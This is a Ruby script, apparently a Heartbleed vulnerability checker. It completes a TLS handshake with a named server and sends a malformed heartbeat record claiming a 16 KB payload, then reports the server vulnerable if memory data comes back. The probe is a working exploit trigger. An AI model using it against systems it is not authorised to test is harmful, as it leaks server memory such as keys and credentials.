# encoding: BINARY
require 'socket'
require 'timeout'

HANDSHAKE = -> {
  data = <<-EOS
16 03 01 00 38 01 00 00 34 03
01 23 18 50 c0 c7 9d 32 9f 90
63 de 32 12 14 1f 8c eb f1 a4
45 2b fd cc 12 87 ca db 32 b5
96 86 16 00 00 06 00 0a 00 2f
00 35 01 00 00 05 00 0f 00 01
01
EOS
  [data.split(/\s/).join("")].pack('H*')
}.call

PAYLOAD = "\x18\x03\x01\x00\x03\x01\x40\x00" #  0x4000 = 16384 = 2^14, max value to be returned
  
class TLSRecord

  attr_reader :type, :version, :value

  def initialize(type, version, value)
    @type = type
    @version = version
    @value = value
  end

end

def read_record(sock)
  Timeout.timeout(2) do
    type = sock.read(1)
    version = sock.read(2)
    length = sock.read(2).unpack('n')[0]
    value = length > 0 ? sock.read(length) : nil
    TLSRecord.new(type, version, value)
  end
end

def read_until_server_hello_done(sock)
  loop do
    record = read_record(sock)
    break if record.value == "\x0e\x00\x00\x00"
  end
end

server = ARGV[0]
port = ARGV[1] ? ARGV[1].to_i : 443
raise "Usage: ruby heartbeat.rb <server>" unless server

sock = begin
  Timeout.timeout(2) { TCPSocket.open(server, port) }
rescue Timeout::Error
  puts "Couldn't connect to #{server}:#{port}"
  exit 1
end

sock.write(HANDSHAKE)

begin
  read_until_server_hello_done(sock)
rescue Timeout::Error
  puts "Couldn't establish TLS connection."
  exit 1
end

sock.write(PAYLOAD)

begin
  heartbeat = read_record(sock)

  if heartbeat.type == "\x18"
    raise "Server vulnerable!" if heartbeat.value
    puts "Server sent a hearbeat response, but no data. This is OK."
  elsif heartbeat.type == "\x15"
    puts "Server sent an alert instead of a heartbeat response. This is OK."
  else
    raise "Server sent an unexpected ContentType: #{heartbeat.type.inspect}"
  end   
rescue Timeout::Error
  puts "Received a timeout when waiting for heartbeat response. This is OK."
end
